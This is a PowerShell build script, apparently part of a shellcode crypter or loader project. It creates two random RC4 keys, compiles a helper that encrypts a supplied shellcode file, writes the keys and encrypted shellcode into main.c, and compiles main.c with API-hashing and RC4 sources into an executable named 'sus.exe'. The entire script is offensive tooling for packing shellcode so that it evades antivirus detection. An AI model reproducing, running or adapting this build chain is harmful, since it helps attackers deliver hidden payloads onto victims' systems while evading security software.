$shellcodeFilePath = $args[0]
$shellcodeSize = $args[1]
Write-Host [INFO] shellcode file = $shellcodeFilePath
Write-Host [INFO] shellcode size = $shellcodeSize

# Generate Encryption Keys
$KEY1 = -join ((48..57) + (97..122) | Get-Random -Count 32 | % {[char]$_})
$KEY2 = -join ((48..57) + (97..122) | Get-Random -Count 32 | % {[char]$_})
Write-Host [INFO] RC4 KEY1 = $KEY1
Write-Host [INFO] RC4 KEY2 = $KEY2

# Compile crypt.c
cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tc crypt.c $shellcodeFilePath /link /OUT:crypt.exe /SUBSYSTEM:CONSOLE /MACHINE:x64

# Generate encrypted shellcode
.\crypt.exe $KEY1 $KEY2  > .\src\shellcode.c

# Replace with generated keys and shellcode
(Get-Content .\src\main.c) -replace '^#define SHELLCODE_SIZE(.+)$', "#define SHELLCODE_SIZE $($shellcodeSize)" | Set-Content .\src\main.c
(Get-Content .\src\main.c) -replace '^#define KEY1(.+)$', "#define KEY1 ""$($KEY1)""" | Set-Content .\src\main.c
(Get-Content .\src\main.c) -replace '^#define KEY2(.+)$', "#define KEY2 ""$($KEY2)""" | Set-Content .\src\main.c

# Compile
cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tc .\src\main.c .\src\APIHashing.c .\src\RC4.c .\src\shellcode.c /link /OUT:.\src\sus.exe /SUBSYSTEM:CONSOLE /MACHINE:x64
